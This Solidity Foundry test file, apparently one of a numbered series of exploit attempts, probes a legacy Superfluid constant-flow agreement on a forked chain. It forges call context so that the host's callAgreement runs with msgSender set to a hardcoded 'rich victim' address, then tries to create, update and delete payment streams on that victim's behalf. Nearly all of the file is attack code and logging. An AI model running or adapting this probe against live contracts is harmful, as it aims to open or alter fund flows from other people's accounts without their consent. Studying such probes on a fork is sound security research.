// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface ILegacyCFA is ISuperAgreement {
    function createFlow(address token, address receiver, int96 flowRate, bytes calldata ctx)
        external
        returns (bytes memory newCtx);

    function updateFlow(address token, address receiver, int96 flowRate, bytes calldata ctx)
        external
        returns (bytes memory newCtx);

    function deleteFlow(address token, address sender, address receiver, bytes calldata ctx)
        external
        returns (bytes memory newCtx);

    function getFlow(address token, address sender, address receiver)
        external
        view
        returns (uint256 timestamp, int96 flowRate, uint256 deposit, uint256 owedDeposit);

    function getDepositRequiredForFlowRate(address token, int96 flowRate) external view returns (uint256);
}

interface IMATICxLike {
    function balanceOf(address account) external view returns (uint256);

    function upgradeByETH() external payable;
}

/// @title Attempt27
/// @notice Hypothesis: the unverified legacy CFA on the ch5 fork may have a
///         `claim()`-style ctx-validation omission on one of the 16 live
///         mutators. This PoC reuses the host trailing-bytes splice pattern and
///         probes `createFlow`, `updateFlow`, and `deleteFlow` with:
///         1. a forged ctx that exactly mirrors the real attacker caller, and
///         2. the same shape with only `msgSender` changed to a rich victim.
///
///         If attacker-self still reverts `invalid ctx`, the forged trailing
///         splice does not reproduce a valid CFA top-level ctx. If the attacker
///         control succeeds but the victim probe returns `invalid ctx`, then the
///         Host/CFA stamp gate is working as intended. Any other victim error or
///         success is a new vector.
contract Attempt27 is Test {
    uint256 internal constant FORK_BLOCK = 27_039_967;

    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant RICH_VICTIM = 0x1c81F6A5dbD715BE1a66a38F7Ed3Bbcd4098EDd4;

    address internal constant HOST_ADDR = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant CFA_ADDR = 0x6EeE6060f715257b970700bc2656De21dEdF074C;
    address internal constant MATICX_ADDR = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    int96 internal constant FLOW_RATE = 1_000_000;
    int96 internal constant UPDATED_FLOW_RATE = 2_000_000;

    ISuperfluidHost internal constant HOST = ISuperfluidHost(HOST_ADDR);
    ILegacyCFA internal constant CFA = ILegacyCFA(CFA_ADDR);
    IMATICxLike internal constant MATICX = IMATICxLike(MATICX_ADDR);

    address internal plainCreateReceiver;
    address internal forgedCreateReceiver;
    address internal victimCreateReceiver;
    address internal attackerUpdateReceiver;
    address internal victimUpdateReceiver;
    address internal attackerDeleteReceiver;
    address internal victimDeleteReceiver;

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);

        plainCreateReceiver = makeAddr("plainCreateReceiver");
        forgedCreateReceiver = makeAddr("forgedCreateReceiver");
        victimCreateReceiver = makeAddr("victimCreateReceiver");
        attackerUpdateReceiver = makeAddr("attackerUpdateReceiver");
        victimUpdateReceiver = makeAddr("victimUpdateReceiver");
        attackerDeleteReceiver = makeAddr("attackerDeleteReceiver");
        victimDeleteReceiver = makeAddr("victimDeleteReceiver");

        vm.label(ATTACKER, "Attacker");
        vm.label(RICH_VICTIM, "RichVictim");
        vm.label(HOST_ADDR, "SuperfluidHost");
        vm.label(CFA_ADDR, "LegacyCFA");
        vm.label(MATICX_ADDR, "MATICx");
        vm.label(plainCreateReceiver, "PlainCreateReceiver");
        vm.label(forgedCreateReceiver, "ForgedCreateReceiver");
        vm.label(victimCreateReceiver, "VictimCreateReceiver");
        vm.label(attackerUpdateReceiver, "AttackerUpdateReceiver");
        vm.label(victimUpdateReceiver, "VictimUpdateReceiver");
        vm.label(attackerDeleteReceiver, "AttackerDeleteReceiver");
        vm.label(victimDeleteReceiver, "VictimDeleteReceiver");
    }

    function test_cfa_authorize_token_access_matrix() public {
        _prepareAttackerBalances();
        _logPreflight();

        _probeCreateFlow();
        _probeUpdateFlow();
        _probeDeleteFlow();
    }

    function _probeCreateFlow() internal {
        console.log("");
        console.log("[probe] createFlow");

        vm.prank(ATTACKER);
        (bool plainOk, bytes memory plainRet) =
            _callPlainHost(abi.encodeCall(CFA.createFlow, (MATICX_ADDR, plainCreateReceiver, FLOW_RATE, new bytes(0))), "");
        _logCallResult("createFlow(host plain baseline)", plainOk, plainRet);
        require(plainOk, string.concat("plain createFlow baseline failed: ", _decodeRevert(plainRet)));
        _logFlowState("plain baseline flow", ATTACKER, plainCreateReceiver);

        bytes memory attackerCtx = _buildContext(ATTACKER, CFA.createFlow.selector, "");
        bytes memory attackerInner =
            abi.encodeCall(CFA.createFlow, (MATICX_ADDR, forgedCreateReceiver, FLOW_RATE, attackerCtx));

        vm.prank(ATTACKER);
        (bool attackerOk, bytes memory attackerRet) = _callHostWithTrailingCtx(attackerInner, "");
        _logCallResult("createFlow(host trailing ctx, forged msgSender=attacker)", attackerOk, attackerRet);
        _logFlowState("attacker forged flow", ATTACKER, forgedCreateReceiver);

        bytes memory victimCtx = _buildContext(RICH_VICTIM, CFA.createFlow.selector, "");
        bytes memory victimInner =
            abi.encodeCall(CFA.createFlow, (MATICX_ADDR, victimCreateReceiver, FLOW_RATE, victimCtx));

        vm.prank(ATTACKER);
        (bool victimOk, bytes memory victimRet) = _callHostWithTrailingCtx(victimInner, "");
        _logCallResult("createFlow(host trailing ctx, forged msgSender=rich victim)", victimOk, victimRet);
        _logFlowState("victim forged flow", RICH_VICTIM, victimCreateReceiver);
    }

    function _probeUpdateFlow() internal {
        console.log("");
        console.log("[probe] updateFlow");

        vm.prank(ATTACKER);
        (bool setupOk, bytes memory setupRet) = _callPlainHost(
            abi.encodeCall(CFA.createFlow, (MATICX_ADDR, attackerUpdateReceiver, FLOW_RATE, new bytes(0))), ""
        );
        require(setupOk, string.concat("updateFlow setup create failed: ", _decodeRevert(setupRet)));
        _logFlowState("attacker update baseline before", ATTACKER, attackerUpdateReceiver);

        bytes memory attackerCtx = _buildContext(ATTACKER, CFA.updateFlow.selector, "");
        bytes memory attackerInner =
            abi.encodeCall(CFA.updateFlow, (MATICX_ADDR, attackerUpdateReceiver, UPDATED_FLOW_RATE, attackerCtx));

        vm.prank(ATTACKER);
        (bool attackerOk, bytes memory attackerRet) = _callHostWithTrailingCtx(attackerInner, "");
        _logCallResult("updateFlow(host trailing ctx, forged msgSender=attacker)", attackerOk, attackerRet);
        _logFlowState("attacker update after forged call", ATTACKER, attackerUpdateReceiver);

        bytes memory victimCtx = _buildContext(RICH_VICTIM, CFA.updateFlow.selector, "");
        bytes memory victimInner =
            abi.encodeCall(CFA.updateFlow, (MATICX_ADDR, victimUpdateReceiver, UPDATED_FLOW_RATE, victimCtx));

        vm.prank(ATTACKER);
        (bool victimOk, bytes memory victimRet) = _callHostWithTrailingCtx(victimInner, "");
        _logCallResult("updateFlow(host trailing ctx, forged msgSender=rich victim)", victimOk, victimRet);
        _logFlowState("victim update after forged call", RICH_VICTIM, victimUpdateReceiver);
    }

    function _probeDeleteFlow() internal {
        console.log("");
        console.log("[probe] deleteFlow");

        vm.prank(ATTACKER);
        (bool setupOk, bytes memory setupRet) = _callPlainHost(
            abi.encodeCall(CFA.createFlow, (MATICX_ADDR, attackerDeleteReceiver, FLOW_RATE, new bytes(0))), ""
        );
        require(setupOk, string.concat("deleteFlow setup create failed: ", _decodeRevert(setupRet)));
        _logFlowState("attacker delete baseline before", ATTACKER, attackerDeleteReceiver);

        bytes memory attackerCtx = _buildContext(ATTACKER, CFA.deleteFlow.selector, "");
        bytes memory attackerInner =
            abi.encodeCall(CFA.deleteFlow, (MATICX_ADDR, ATTACKER, attackerDeleteReceiver, attackerCtx));

        vm.prank(ATTACKER);
        (bool attackerOk, bytes memory attackerRet) = _callHostWithTrailingCtx(attackerInner, "");
        _logCallResult("deleteFlow(host trailing ctx, forged msgSender=attacker)", attackerOk, attackerRet);
        _logFlowState("attacker delete after forged call", ATTACKER, attackerDeleteReceiver);

        bytes memory victimCtx = _buildContext(RICH_VICTIM, CFA.deleteFlow.selector, "");
        bytes memory victimInner =
            abi.encodeCall(CFA.deleteFlow, (MATICX_ADDR, RICH_VICTIM, victimDeleteReceiver, victimCtx));

        vm.prank(ATTACKER);
        (bool victimOk, bytes memory victimRet) = _callHostWithTrailingCtx(victimInner, "");
        _logCallResult("deleteFlow(host trailing ctx, forged msgSender=rich victim)", victimOk, victimRet);
        _logFlowState("victim delete after forged call", RICH_VICTIM, victimDeleteReceiver);
    }

    function _prepareAttackerBalances() internal {
        vm.deal(ATTACKER, 20 ether);

        vm.prank(ATTACKER);
        MATICX.upgradeByETH{value: 10 ether}();
    }

    function _buildContext(address forgedMsgSender, bytes4 selector, bytes memory userData)
        internal
        view
        returns (bytes memory)
    {
        ContextUtils.Context memory context = ContextUtils.buildContext(forgedMsgSender, selector, userData);
        return ContextUtils.encodeContext(context);
    }

    function _callPlainHost(bytes memory inner, bytes memory userData) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (CFA, inner, userData)));
    }

    function _callHostWithTrailingCtx(bytes memory inner, bytes memory userData)
        internal
        returns (bool ok, bytes memory ret)
    {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (CFA, outer, userData)));
    }

    function _logPreflight() internal view {
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);
        console.log("[preflight] attacker native:", ATTACKER.balance);
        console.log("[preflight] attacker MATICx:", MATICX.balanceOf(ATTACKER));
        console.log("[preflight] rich victim native:", RICH_VICTIM.balance);
        console.log("[preflight] rich victim MATICx:", MATICX.balanceOf(RICH_VICTIM));
        console.log("[preflight] deposit required for create rate:", CFA.getDepositRequiredForFlowRate(MATICX_ADDR, FLOW_RATE));
        console.log(
            "[preflight] deposit required for update rate:", CFA.getDepositRequiredForFlowRate(MATICX_ADDR, UPDATED_FLOW_RATE)
        );
    }

    function _logFlowState(string memory label, address sender, address receiver) internal view {
        (uint256 timestamp, int96 flowRate, uint256 deposit, uint256 owedDeposit) = CFA.getFlow(MATICX_ADDR, sender, receiver);

        console.log(label);
        console.log("  sender:", sender);
        console.log("  receiver:", receiver);
        console.log("  timestamp:", timestamp);
        console.logInt(int256(flowRate));
        console.log("  deposit:", deposit);
        console.log("  owedDeposit:", owedDeposit);
    }

    function _logCallResult(string memory label, bool ok, bytes memory wrappedRet) internal pure {
        console.log(label);
        console.log("  ok:", ok);

        if (!ok) {
            console.log("  revert:", _decodeRevert(wrappedRet));
            return;
        }

        bytes memory returnedData = _decodeHostReturn(wrappedRet);
        console.log("  host return bytes:", wrappedRet.length);
        console.log("  agreement return bytes:", returnedData.length);
        console.log("  agreement return hash:");
        console.logBytes32(keccak256(returnedData));
    }

    function _decodeHostReturn(bytes memory wrappedRet) internal pure returns (bytes memory returnedData) {
        if (wrappedRet.length == 0) {
            return new bytes(0);
        }

        return abi.decode(wrappedRet, (bytes));
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) return "silent revert";
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
